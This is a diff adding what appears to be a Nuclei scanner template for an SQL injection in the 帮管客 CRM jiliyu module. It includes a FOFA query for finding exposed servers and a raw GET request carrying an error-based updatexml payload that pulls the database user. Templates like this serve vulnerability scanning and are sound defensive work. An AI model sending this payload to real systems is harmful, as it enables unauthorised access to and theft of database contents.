@@ -1,0 +1,28 @@
+id: bangguan-crm-sqli
+
+info:
+  name: 帮管客CRM jiliyu组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="帮管客-CRM"
+    帮管客CRM系统jiliyu模块存在SQL注入安全缺陷，攻击者可通过构造恶意输入参数实现数据库敏感信息获取，导致数据泄露或完整性受损。
+  tags: 帮管客-CRM
+
+http:
+- raw:
+  - |
+    GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20user()),0x7f),1)) HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'syntax'
+  - type: word
+    part: body
+    words:
+    - 'error'
